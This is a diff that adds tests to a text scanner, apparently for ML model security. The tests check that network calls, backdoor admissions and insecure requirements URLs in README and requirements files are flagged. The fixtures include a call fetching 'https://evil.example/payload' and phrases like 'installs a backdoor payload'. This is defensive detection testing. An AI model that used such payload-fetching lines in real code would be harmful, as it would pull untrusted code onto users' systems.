@@ -82,6 +82,41 @@ def test_text_scanner_documentation_network_api_prose_is_informational(tmp_path:
     assert determine_exit_code(aggregate) == 0
 
 
+def test_text_scanner_later_network_api_call_is_not_hidden_by_prose(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        'Use requests.get to download weights.\nrequests.get("https://evil.example/payload")\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_indirect_network_api_call_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("executor.submit(requests.get, endpoint)\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
 @pytest.mark.parametrize(
     "content",
     [
@@ -104,6 +139,46 @@ def test_text_scanner_documentation_code_url_argument_remains_actionable(tmp_pat
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "endpoint: https://evil.example/payload\n",
+        "<endpoint>https://evil.example/payload</endpoint>\n",
+    ],
+)
+def test_text_scanner_documentation_endpoint_config_remains_actionable(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "Python documentation: https://docs.python.org/3/library/exec.html\n",
+        "PowerShell documentation: https://learn.microsoft.com/powershell/scripting/overview\n",
+        "Read the docs; see https://docs.example.com/reference\n",
+        "For details (see https://docs.example.com/reference).\n",
+        "If you need help, visit https://docs.example.com/reference\n",
+    ],
+)
+def test_text_scanner_documentation_prose_markers_remain_informational(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
 def test_text_scanner_routes_rst_documentation_sidecars(tmp_path: Path) -> None:
@@ -152,6 +227,43 @@ def test_text_scanner_documentation_cc_admission_remains_actionable(tmp_path: Pa
     )
 
 
+def test_text_scanner_benign_cc_phrase_does_not_hide_separate_admission(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("Malware detection bypass installs a backdoor payload.\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    cc_checks = {
+        check.details.get("pattern"): check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.details.get("type") == "cc_pattern"
+    }
+    assert cc_checks["malware"].severity == IssueSeverity.INFO
+    assert cc_checks["backdoor"].severity == IssueSeverity.CRITICAL
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_later_cc_admission_is_not_hidden_by_benign_prose(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "Backdoor robustness benchmark.\nThis artifact installs a backdoor payload.\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "cc_pattern"
+        and check.details.get("pattern") == "backdoor"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_documentation_placeholder_secrets_are_ignored(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text(
@@ -198,12 +310,24 @@ def test_text_scanner_requirements_urls_remain_actionable(tmp_path: Path) -> Non
     assert determine_exit_code(aggregate) == 1
 
 
-def test_text_scanner_standard_requirements_urls_are_informational(tmp_path: Path) -> None:
+@pytest.mark.parametrize(
+    "requirement_line",
+    [
+        "--index-url https://pypi.org/simple",
+        "--index-url=https://pypi.org/simple",
+        "--extra-index-url=https://pypi.org/simple",
+        "-ihttps://pypi.org/simple",
+        "--find-links=https://download.pytorch.org/whl/cpu",
+        "-fhttps://download.pytorch.org/whl/cpu",
+        "demo @ https://files.pythonhosted.org/packages/demo.whl",
+    ],
+)
+def test_text_scanner_standard_requirements_urls_are_informational(
+    tmp_path: Path,
+    requirement_line: str,
+) -> None:
     text_path = tmp_path / "requirements.txt"
-    text_path.write_text(
-        "--index-url https://pypi.org/simple\ndemo @ https://files.pythonhosted.org/packages/demo.whl\n",
-        encoding="utf-8",
-    )
+    text_path.write_text(f"{requirement_line}\n", encoding="utf-8")
 
     result = TextScanner().scan(str(text_path))
     aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
@@ -217,6 +341,32 @@ def test_text_scanner_standard_requirements_urls_are_informational(tmp_path: Pat
     assert all(check.severity == IssueSeverity.INFO for check in network_checks)
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    "requirement_line",
+    [
+        "--index-url http://pypi.org/simple",
+        "--index-url https://pypi.org:4444/simple",
+        "--trusted-host pypi.org",
+    ],
+)
+def test_text_scanner_insecure_standard_requirements_url_remains_actionable(
+    tmp_path: Path,
+    requirement_line: str,
+) -> None:
+    text_path = tmp_path / "requirements.txt"
+    text_path.write_text(f"{requirement_line}\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
 
 
 def test_text_scanner_bare_vocabulary_urls_are_informational(tmp_path: Path) -> None:
